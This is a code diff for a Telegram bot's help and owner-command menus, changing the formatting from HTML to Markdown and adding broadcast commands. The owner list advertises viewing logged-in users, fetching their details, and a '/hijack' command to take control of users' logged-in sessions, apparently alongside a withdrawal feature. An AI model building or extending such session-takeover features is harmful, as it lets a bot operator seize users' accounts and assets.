@@ -114,28 +114,32 @@ async def help_command(_, message: Message):
     buttons = [
         [InlineKeyboardButton("🔐 Owner Commands", callback_data="admin_cmds:1")]
     ]
-    await message.reply_text("""🤖 <b>Bot Help Menu</b>
+    await message.reply_text(
+        """🤖 *Bot Help Menu*
 
 Here's what I can do for you:
 
-• /login – Authenticate with your account  
-• /logout – Logout from your account  
-• /withdraw – Start fast withdraw process  
-• /cancel – Cancel any pending operation  
-• /start – Show welcome screen with buttons  
-• /help – Display this help message  
-""", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(buttons))
+• `/login`           – 🔑 Authenticate with your account  
+• `/logout`          – 🚪 Logout from your account  
+• `/withdraw`        – 💸 Start fast withdraw process  
+• `/cancel`          – ❌ Cancel any pending operation  
+• `/start`           – 🏁 Show welcome screen with buttons  
+• `/help`            – 📖 Display this help message  
+""",
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=InlineKeyboardMarkup(buttons)
+    )
 
-
+# Owner commands list
 OWNER_CMDS = [
-    ("/stats","         📊 View overall bot usage statistics"),
-    ("/details","       📋 Paginated list of logged-in & started users"),
-    ("/get","           🔍 Fetch user details using user ID"),
-    ("/hijack","        🎮 Temporarily control another logged-in session"),
-    ("/cancel_hijack"," 🛑 Revoke hijack and return control to user"),
+    ("/stats",          "📊 View overall bot usage statistics"),
+    ("/details",        "📋 Paginated list of logged-in & started users"),
+    ("/get",            "🔍 Fetch user details using user ID"),
+    ("/gcast",          "📢 Broadcast message to all users"),
+    ("/cancel_gcast",   "❌ Cancel any ongoing broadcast"),
+    ("/hijack",         "🎮 Temporarily control another logged-in session"),
+    ("/cancel_hijack",  "🛑 Revoke hijack and return control to user"),
 ]
-
-
 
 @app.on_callback_query(filters.regex(r"^admin_cmds:(\d+)$"))
 async def admin_commands_pagination(client: Client, query: CallbackQuery):
@@ -146,25 +150,28 @@ async def admin_commands_pagination(client: Client, query: CallbackQuery):
         await query.answer("😏 Ohh nice try! You're not the admin 😂", show_alert=True)
         return
 
+    total_cmds = len(OWNER_CMDS)
+    total_pages = (total_cmds + OWNER_COMMANDS_PER_PAGE - 1) // OWNER_COMMANDS_PER_PAGE
     start = (page - 1) * OWNER_COMMANDS_PER_PAGE
     end = start + OWNER_COMMANDS_PER_PAGE
-    total_pages = (len(OWNER_CMDS) - 1) // OWNER_COMMANDS_PER_PAGE + 1
 
-    text = f"<b>🔐 Owner Only Commands (Page {page}/{total_pages})</b>\n\n"
+    # Build message text
+    text = f"🔐 **Owner Only Commands** (Page {page}/{total_pages})\n\n"
     for cmd, desc in OWNER_CMDS[start:end]:
-        text += f"<code>{cmd}</code> — {desc}\n"
+        text += f"**{cmd}**\n{desc}\n\n"  # Adding line breaks between commands
 
+    # Navigation buttons
     nav_buttons = []
     if page > 1:
-        nav_buttons.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"admin_cmds:{page-1}"))
-    if end < len(OWNER_CMDS):
-        nav_buttons.append(InlineKeyboardButton("➡️ Next", callback_data=f"admin_cmds:{page+1}"))
+        nav_buttons.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"admin_cmds:{page - 1}"))
+    if page < total_pages:
+        nav_buttons.append(InlineKeyboardButton("➡️ Next", callback_data=f"admin_cmds:{page + 1}"))
 
     markup = InlineKeyboardMarkup([nav_buttons]) if nav_buttons else None
 
     await query.message.edit_text(
         text.strip(),
-        parse_mode=ParseMode.HTML,
+        parse_mode=ParseMode.MARKDOWN,
         reply_markup=markup
     )
 
